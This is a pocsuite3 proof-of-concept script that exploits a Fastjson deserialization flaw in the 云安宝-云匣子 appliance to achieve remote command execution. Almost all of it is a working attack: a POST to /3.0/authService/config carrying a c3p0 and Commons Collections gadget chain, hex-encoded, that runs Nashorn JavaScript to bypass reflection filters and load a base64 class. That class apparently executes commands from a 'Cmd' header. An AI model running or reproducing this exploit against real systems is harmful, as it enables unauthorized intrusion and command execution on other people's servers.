# _*_ coding:utf-8 _*_
# @Time : 2023/12/09 20:18
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class yunbaoan_fastjson(POCBase):
    pocDesc = '''云安宝-云匣子Fastjson命令执行'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-09'
    name = '云安宝-云匣子Fastjson命令执行'



    def _verify(self):

        result = {}
        path = "/3.0/authService/config"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Upgrade-Insecure-Requests': '1',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Dnt': '1',
            'Cmd': 'echo test',
            'Referer': self.url
        }
        data='{"a":{"@type":"java.lang.Class","val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"b":{"@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000047372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200206a617661782e7363726970742e536372697074456e67696e654d616e61676572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000b6e6577496e7374616e6365757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007371007e00137571007e0018000000017400026a7374000f676574456e67696e6542794e616d657571007e001b00000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00137571007e00180000000174202b747279207b0a20206c6f616428226e6173686f726e3a6d6f7a696c6c615f636f6d7061742e6a7322293b0a7d20636174636820286529207b7d0a66756e6374696f6e20676574556e7361666528297b0a202076617220746865556e736166654d6574686f64203d206a6176612e6c616e672e436c6173732e666f724e616d65282273756e2e6d6973632e556e7361666522292e6765744465636c617265644669656c642827746865556e7361666527293b0a2020746865556e736166654d6574686f642e73657441636365737369626c652874727565293b200a202072657475726e20746865556e736166654d6574686f642e676574286e756c6c293b0a7d0a66756e6374696f6e2072656d6f7665436c617373436163686528636c617a7a297b0a202076617220756e73616665203d20676574556e7361666528293b0a202076617220636c617a7a416e6f6e796d6f7573436c617373203d20756e736166652e646566696e65416e6f6e796d6f7573436c61737328636c617a7a2c6a6176612e6c616e672e436c6173732e666f724e616d6528226a6176612e6c616e672e436c61737322292e6765745265736f75726365417353747265616d2822436c6173732e636c61737322292e72656164416c6c427974657328292c6e756c6c293b0a2020766172207265666c656374696f6e446174614669656c64203d20636c617a7a416e6f6e796d6f7573436c6173732e6765744465636c617265644669656c6428227265666c656374696f6e4461746122293b0a2020756e736166652e7075744f626a65637428636c617a7a2c756e736166652e6f626a6563744669656c644f6666736574287265666c656374696f6e446174614669656c64292c6e756c6c293b0a7d0a66756e6374696f6e206279706173735265666c656374696f6e46696c7465722829207b0a2020766172207265666c656374696f6e436c6173733b0a2020747279207b0a202020207265666c656374696f6e436c617373203d206a6176612e6c616e672e436c6173732e666f724e616d6528226a646b2e696e7465726e616c2e7265666c6563742e5265666c656374696f6e22293b0a20207d20636174636820286572726f7229207b0a202020207265666c656374696f6e436c617373203d206a6176612e6c616e672e436c6173732e666f724e616d65282273756e2e7265666c6563742e5265666c656374696f6e22293b0a20207d0a202076617220756e73616665203d20676574556e7361666528293b0a202076617220636c617373427566666572203d207265666c656374696f6e436c6173732e6765745265736f75726365417353747265616d28225265666c656374696f6e2e636c61737322292e72656164416c6c427974657328293b0a2020766172207265666c656374696f6e416e6f6e796d6f7573436c617373203d20756e736166652e646566696e65416e6f6e796d6f7573436c617373287265666c656374696f6e436c6173732c20636c6173734275666665722c206e756c6c293b0a2020766172206669656c6446696c7465724d61704669656c64203d207265666c656374696f6e416e6f6e796d6f7573436c6173732e6765744465636c617265644669656c6428226669656c6446696c7465724d617022293b0a2020766172206d6574686f6446696c7465724d61704669656c64203d207265666c656374696f6e416e6f6e796d6f7573436c6173732e6765744465636c617265644669656c6428226d6574686f6446696c7465724d617022293b0a2020696620286669656c6446696c7465724d61704669656c642e6765745479706528292e697341737369676e61626c6546726f6d286a6176612e6c616e672e436c6173732e666f724e616d6528226a6176612e7574696c2e486173684d617022292929207b0a20202020756e736166652e7075744f626a656374287265666c656374696f6e436c6173732c20756e736166652e7374617469634669656c644f6666736574286669656c6446696c7465724d61704669656c64292c206a6176612e6c616e672e436c6173732e666f724e616d6528226a6176612e7574696c2e486173684d617022292e676574436f6e7374727563746f7228292e6e6577496e7374616e63652829293b0a20207d0a2020696620286d6574686f6446696c7465724d61704669656c642e6765745479706528292e697341737369676e61626c6546726f6d286a6176612e6c616e672e436c6173732e666f724e616d6528226a6176612e7574696c2e486173684d617022292929207b0a20202020756e736166652e7075744f626a656374287265666c656374696f6e436c6173732c20756e736166652e7374617469634669656c644f6666736574286d6574686f6446696c7465724d61704669656c64292c206a6176612e6c616e672e436c6173732e666f724e616d6528226a6176612e7574696c2e486173684d617022292e676574436f6e7374727563746f7228292e6e6577496e7374616e63652829293b0a20207d0a202072656d6f7665436c6173734361636865286a6176612e6c616e672e436c6173732e666f724e616d6528226a6176612e6c616e672e436c6173732229293b0a7d0a66756e6374696f6e2073657441636365737369626c652861636365737369626c654f626a656374297b0a2020202076617220756e73616665203d20676574556e7361666528293b0a20202020766172206f766572726964654669656c64203d206a6176612e6c616e672e436c6173732e666f724e616d6528226a6176612e6c616e672e7265666c6563742e41636365737369626c654f626a65637422292e6765744465636c617265644669656c6428226f7665727269646522293b0a20202020766172206f6666736574203d20756e736166652e6f626a6563744669656c644f6666736574286f766572726964654669656c64293b0a20202020756e736166652e707574426f6f6c65616e2861636365737369626c654f626a6563742c206f66667365742c2074727565293b0a7d0a66756e6374696f6e20646566696e65436c617373286279746573297b0a202076617220636c7a203d206e756c6c3b0a20207661722076657273696f6e203d206a6176612e6c616e672e53797374656d2e67657450726f706572747928226a6176612e76657273696f6e22293b0a202076617220756e73616665203d20676574556e7361666528290a202076617220636c6173734c6f61646572203d206e6577206a6176612e6e65742e55524c436c6173734c6f61646572286a6176612e6c616e672e7265666c6563742e41727261792e6e6577496e7374616e6365286a6176612e6c616e672e436c6173732e666f724e616d6528226a6176612e6e65742e55524c22292c203029293b0a20207472797b0a202020206966202876657273696f6e2e73706c697428222e22295b305d203e3d20313129207b0a2020202020206279706173735265666c656374696f6e46696c74657228293b0a20202020646566696e65436c6173734d6574686f64203d206a6176612e6c616e672e436c6173732e666f724e616d6528226a6176612e6c616e672e436c6173734c6f6164657222292e6765744465636c617265644d6574686f642822646566696e65436c617373222c206a6176612e6c616e672e436c6173732e666f724e616d6528225b4222292c6a6176612e6c616e672e496e74656765722e545950452c206a6176612e6c616e672e496e74656765722e54595045293b0a2020202073657441636365737369626c6528646566696e65436c6173734d6574686f64293b0a202020202f2f20e7bb95e8bf872073657441636365737369626c65200a20202020636c7a203d20646566696e65436c6173734d6574686f642e696e766f6b6528636c6173734c6f616465722c2062797465732c20302c2062797465732e6c656e677468293b0a202020207d656c73657b0a2020202020207661722070726f74656374696f6e446f6d61696e203d206e6577206a6176612e73656375726974792e50726f74656374696f6e446f6d61696e286e6577206a6176612e73656375726974792e436f6465536f75726365286e756c6c2c206a6176612e6c616e672e7265666c6563742e41727261792e6e6577496e7374616e6365286a6176612e6c616e672e436c6173732e666f724e616d6528226a6176612e73656375726974792e636572742e436572746966696361746522292c203029292c206e756c6c2c20636c6173734c6f616465722c205b5d293b0a202020202020636c7a203d20756e736166652e646566696e65436c617373286e756c6c2c2062797465732c20302c2062797465732e6c656e6774682c20636c6173734c6f616465722c2070726f74656374696f6e446f6d61696e293b0a202020207d0a20207d6361746368286572726f72297b0a202020206572726f722e7072696e74537461636b547261636528293b0a20207d66696e616c6c797b0a2020202072657475726e20636c7a3b0a20207d0a7d0a66756e6374696f6e206261736536344465636f6465546f427974652873747229207b0a20207661722062743b0a20207472797b0a202020206274203d206a6176612e6c616e672e436c6173732e666f724e616d65282273756e2e6d6973632e4241534536344465636f64657222292e6e6577496e7374616e636528292e6465636f646542756666657228737472293b0a20207d63617463682865297b7d0a2020696620286274203d3d206e756c6c297b0a202020207472797b0a2020202020206274203d206a6176612e6c616e672e436c6173732e666f724e616d6528226a6176612e7574696c2e42617365363422292e6e6577496e7374616e636528292e6765744465636f64657228292e6465636f646528737472293b0a202020207d63617463682865297b7d0a20207d0a2020696620286274203d3d206e756c6c297b0a202020206274203d206a6176612e6c616e672e436c6173732e666f724e616d6528226f72672e6170616368652e636f6d6d6f6e732e636f6465632e62696e6172792e42617365363422292e6e6577496e7374616e636528292e6465636f646528737472290a20207d0a202072657475726e2062743b0a7d0a76617220636f64653d2279763636766741414144494177516f41435142524367425341464d4b414649415641674156516f4156674258434142594277425a4367414841466f484146734b41467741585167415867674158776741594167415951674159676f414277426a4341426b4341426c4277426d43674263414763494147674b4144304161516f41435142714341427243414273434142744341427543674154414738494148414b4148454163676f414577427a43674154414851494148554b41424d4164676741647767416541634165516f414a5142524367416c41486f494148734b414355416641674166516741666767416677674167416f41675143434367434241494d484149514b4149554168676f414d414348434143494367417741496b4b4144414169676f414d41434c436743464149774b414955416a5163416a676f414f5142384341435043674139414a4148414a454241415938615735706444344241414d6f4b565942414152446232526c4151415054476c755a55353162574a6c636c5268596d786c4151414c614746755a464a6c6358566c633351424141704665474e6c634852706232357a415141455a58686c597745414a69684d616d4632595339735957356e4c314e30636d6c755a7a737054477068646d4576624746755a79395464484a70626d63374151414e553352685932744e5958425559574a735a5163415a6763416b6763416b77634168416341655163416a6763416c4145414344786a62476c756158512b4151414b55323931636d4e6c526d6c735a51454143464e464d53357159585a684441412b41443848414a554d414a59416c7777416d41435a4151413862334a6e4c6e4e77636d6c755a325a795957316c64323979617935335a5749755932397564475634644335795a5846315a584e304c6c4a6c6358566c63335244623235305a586830534739735a4756794277436144414362414a77424142526e5a5852535a5846315a584e3051585230636d6c696458526c6377454144327068646d4576624746755a7939446247467a637777416e51436541514151616d4632595339735957356e4c303969616d566a644163416e7777416f4143684151424162334a6e4c6e4e77636d6c755a325a795957316c64323979617935335a5749755932397564475634644335795a5846315a584e304c6c4e6c636e5a735a5852535a5846315a584e3051585230636d6c696458526c637745414332646c64464a6c63334276626e4e6c4151414b5a325630556d56786457567a6441454148577068646d46344c6e4e6c636e5a735a58517555325679646d786c64464a6c63334276626e4e6c4151414a5a32563056334a706447567944414369414a34424143567159585a686543357a5a584a32624756304c6d6830644841755348523063464e6c636e5a735a5852535a5846315a584e304151414a5a325630534756685a47567941514151616d4632595339735957356e4c314e30636d6c755a7777416f77436b415141445932316b444142454145554d414b5541706745414233427961573530624734424141566d6248567a6141454142574e7362334e6c415141414441436e414b674241416476637935755957316c42774370444143714145554d414b734172417741725143734151414464326c7544414375414b3842414152776157356e415141434c5734424142647159585a684c327868626d6376553352796157356e516e56706247526c636777417341437841514146494331754944514d414c4941724145414169396a41514146494331304944514241414a7a614145414169316a4277437a44414330414c554d414551417467454145577068646d4576645852706243395459324675626d56794277435344414333414c674d4144344175514541416c786844414336414c734d414c774176517741766743734441432f414c674d414d41415077454145327068646d4576624746755a79394665474e6c63485270623234424142426a623231745957356b494735766443427564577873444142434144384241414e54525445424142467159585a684c327868626d637655484a765932567a637745414531744d616d4632595339735957356e4c314e30636d6c755a7a734241424e7159585a684c327868626d63765647687962336468596d786c41514151616d4632595339735957356e4c31526f636d56685a41454144574e31636e4a6c626e525561484a6c595751424142516f4b55787159585a684c327868626d6376564768795a57466b4f7745414657646c64454e76626e526c654852446247467a633078765957526c636745414753677054477068646d4576624746755a7939446247467a633078765957526c636a73424142567159585a684c327868626d63765132786863334e4d6232466b5a58494241416c736232466b5132786863334d424143556f54477068646d4576624746755a79395464484a70626d63374b55787159585a684c327868626d63765132786863334d374151414a5a325630545756306147396b415142414b45787159585a684c327868626d6376553352796157356e4f31744d616d4632595339735957356e4c304e7359584e7a4f796c4d616d4632595339735957356e4c334a6c5a6d786c59335176545756306147396b4f77454147477068646d4576624746755a7939795a575a735a574e304c30316c644768765a414541426d6c75646d39725a5145414f53684d616d4632595339735957356e4c303969616d566a6444746254477068646d4576624746755a793950596d706c593351374b55787159585a684c327868626d637654324a715a574e304f7745414557646c6445526c59327868636d566b545756306147396b4151414e6332563051574e6a5a584e7a61574a735a514541424368614b5659424141686e5a5852446247467a637745414579677054477068646d4576624746755a7939446247467a637a734241415a6c6358566862484d424142556f54477068646d4576624746755a793950596d706c593351374b566f424142427159585a684c327868626d637655336c7a644756744151414c5a32563055484a766347567964486b424141743062307876643256795132467a5a5145414643677054477068646d4576624746755a79395464484a70626d63374151414564484a706251454143474e76626e52686157357a415141624b45787159585a684c327868626d637651326868636c4e6c6358566c626d4e6c4f796c6141514147595842775a57356b415141744b45787159585a684c327868626d6376553352796157356e4f796c4d616d4632595339735957356e4c314e30636d6c755a304a316157786b5a584937415141496447395464484a70626d63424142467159585a684c327868626d6376556e567564476c745a514541436d646c64464a31626e5270625755424142556f4b55787159585a684c327868626d6376556e567564476c745a5473424143676f5730787159585a684c327868626d6376553352796157356e4f796c4d616d4632595339735957356e4c31427962324e6c63334d374151414f5a325630535735776458525464484a6c595730424142636f4b55787159585a684c326c764c306c7563485630553352795a5746744f7745414743684d616d4632595339706279394a626e423164464e30636d566862547370566745414448567a5a55526c62476c746158526c636745414a79684d616d4632595339735957356e4c314e30636d6c755a7a737054477068646d4576645852706243395459324675626d56794f774541423268686330356c6548514241414d6f4b566f42414152755a5868304151414f5a32563052584a7962334a5464484a6c595730424141646b5a584e30636d3935414345415051414a4141414141414145414145415067412f4141454151414141414230414151414241414141425371334141477841414141415142424141414142674142414141414541414a41454941507741434145414141414679414159414377414141524b3441414b3241414d53424c594142557371456759447651414874674149544373424137304143625941436b323441414b3241414d53433759414255737145677744765141487467414954436f5344514f39414165324141684f4b7977447651414a7467414b4f6751744c414f3941416d3241416f3642626741417259414178494f746741464567384476514148746741514f67613441414b3241414d534562594142524953424c304142316b4445684e54746741514f67635a427753324142515a426753324142515a42686b454137304143625941436a6f494751635a4251533941416c5a417849565537594143734141457a6f4a47516d344142593643686b4974674158456867457651414857514d5345314f324142415a4341533941416c5a41786b4b55375941436c635a434c59414678495a413730414237594145426b494137304143625941436c635a434c594146784961413730414237594145426b494137304143625941436c657841414141415142424141414154674154414141414577414d41425141467741564143454146674174414263414f41415941454d414751424f41426f4157514162414738414841434b414230416b414165414a59414877436a4143414175414168414c38414967446841434d412b51416b415245414a514244414141414241414241446b41435142454145554141514241414141436e41414541416741414145324b7359424d6849624b725941484a6f424b5249647541416574674166544371324143424c41553042546973534962594149706b4150796f534937594149706b4149436f534a4c594149706f41463773414a566d33414359717467416e456969324143653241436c4c4272304145316b4445685654575151534b6c4e5a425370545471634150436f534937594149706b4149436f534a4c594149706f41463773414a566d33414359717467416e456975324143653241436c4c4272304145316b4445697854575151534c564e5a42537054547267414c6932324143394e757741775753793241444733414449534d3759414e446f45475153324144575a4141735a424c59414e716341425249624f6757374144425a4c4c59414e3763414d68497a746741304f6753374143565a7477416d475157324143635a424c59414e5a6b4143786b457467413270774146456875324143653241436b3642526b464f675973786741484c4c59414f426b4773446f454751533241446f3642537a474141637374674134475157774f676373786741484c4c59414f426b487678493773414145414a30424277455341446b416e5145484153594141414553415273424a674141415359424b41456d41414141416742424141414165674165414141414b41414e41436b4146674171414273414b7741644143774148774174414367414c6741364143384154674178414751414d7742324144514169674132414a30414f51436c41446f4174774137414d734150414464414430424177412b415163415167454c41454d424477412b41524941507745554145414247774243415238415177456a414541424a6742434153774151774577414555424d77424841455941414143304141372b41453448414563484145674841456b564a524c3841436b4841457042427742482f7741764141594841456348414563484145674841456b4841456f484145634141516341532f3841415141474277424842774248427742494277424a4277424b4277424841414948414573484145663841424d484145662f4141494142416341527763415277634153416341535141424277424d2f5141514277424d427742482f7741434141514841456348414563484145674841456b414151634154663841435141494277424842774248427742494277424a414141414277424e4141442f414149414151634152774141414167415467412f4141454151414141414430414151414241414141434c6741504b6341424575784141454141414144414159414f514143414545414141414f41414d414141414d41414d4144514148414134415267414141416341416b59484145774141414541547741414141494155413d3d223b0a636c7a203d20646566696e65436c617373286261736536344465636f6465546f4279746528636f646529293b0a636c7a2e6e6577496e7374616e636528293b7400046576616c7571007e001b0000000171007e0023737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878;"}}'

        url = self.url + path

        try:
            response = requests.post(url, headers=headers,data=data,verify=False)
        # 验证成功输出相关信息
            print(response.text)
            if response.status_code == 200 and 'test' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(yunbaoan_fastjson)
